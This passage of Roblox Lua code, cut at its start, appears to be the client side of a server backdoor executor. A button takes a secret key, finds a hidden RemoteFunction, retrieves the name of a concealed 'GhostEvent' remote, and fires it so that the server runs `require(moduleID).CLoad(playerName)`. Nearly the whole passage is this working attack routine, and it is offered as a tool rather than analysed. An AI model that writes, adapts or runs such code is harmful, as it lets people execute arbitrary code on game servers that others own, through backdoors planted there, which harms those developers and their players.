	-- and is a descendant of the ScreenGui containing the button.
	local KeyInputBox = Button:FindFirstAncestorOfClass("ScreenGui"):WaitForChild("KeyInputBox", 10) 
	
	if not KeyInputBox or not KeyInputBox:IsA("TextBox") then
		warn("EXEC-SCRIPT: KeyInputBox GUI element (TextBox) not found. Execution aborted.")
		return
	end
	
	-- Get the local player instance for the payload insertion
	local LocalPlayer = Players.LocalPlayer
	local PlayerName = LocalPlayer and LocalPlayer.Name or "UnknownPlayer"
	
	
	local function executePayload()
		Button.Text = "Executing..."
		Button.Active = false
	
		-- Get the password directly from the user's input
		local DUMMY_FUNCTION_NAME = KeyInputBox.Text:match("^%s*(.-)%s*$") -- Trim whitespace
	
		if DUMMY_FUNCTION_NAME == "" or DUMMY_FUNCTION_NAME:len() < 5 or DUMMY_FUNCTION_NAME == "Type Key Here" then
			warn("EXEC-SCRIPT: No key entered or invalid key string.")
			Button.Text = "Enter Key!"
			Button.Active = true
			return
		end
	
		-- --- STEP 1: Find the DummyFunction (The Password) ---
		-- We wait for the specific, user-entered remote function name
		local DummyFunction = ReplicatedStorage:WaitForChild(DUMMY_FUNCTION_NAME, 3) 
	
		if not DummyFunction or not DummyFunction:IsA("RemoteFunction") then
			warn("EXEC-SCRIPT: Failed to verify DummyFunction existence using entered key: " .. DUMMY_FUNCTION_NAME)
			Button.Text = "Key Error"
			Button.Active = true
			return
		end
	
		-- --- STEP 2: Get the GhostEvent Name ---
		-- Use the password key to retrieve the actual event name from the server
		local GhostEventName = nil
		local success, result = pcall(function()
			GhostEventName = DummyFunction:InvokeServer()
		end)
	
		if not success or not GhostEventName or typeof(GhostEventName) ~= "string" then
			warn("EXEC-SCRIPT: Failed to get GhostEvent name. Error:", result)
			Button.Text = "Invoke Failed"
			Button.Active = true
			return
		end
	
		-- --- STEP 3: Find the GhostEvent ---
		local GhostEvent = ReplicatedStorage:WaitForChild(GhostEventName, 10)
	
		if not GhostEvent or not GhostEvent:IsA("RemoteEvent") then
			warn("EXEC-SCRIPT: Could not find the GhostEvent remote:", GhostEventName)
			Button.Text = "Event Missing"
			Button.Active = true
			return
		end
	
		-- --- STEP 4: Build and Execute the Payload ---
		-- Create the final code string with the required Module ID and Player Name
		local codeToExecute = string.format('require(%d).CLoad("%s")', PAYLOAD_MODULE_ID, PlayerName)
	
		-- Send the execution request:
		-- DUMMY_FUNCTION_NAME is the key/password, codeToExecute is the payload.
		GhostEvent:FireServer(DUMMY_FUNCTION_NAME, codeToExecute)
	
		print("GHOST-CLIENT: Payload launched.")
		Button.Text = "Executed!"
	
		-- Re-enable button after a short delay
		task.wait(5)
		Button.Text = "Excavator"
		Button.Active = true
	end
	
	-- Connect the function to the button click
	Button.MouseButton1Click:Connect(executePayload)
	
	-- Set the initial button text
	Button.Text = "Excavator"
	Button.Active = true
end
coroutine.wrap(CYXXDWK_fake_script)()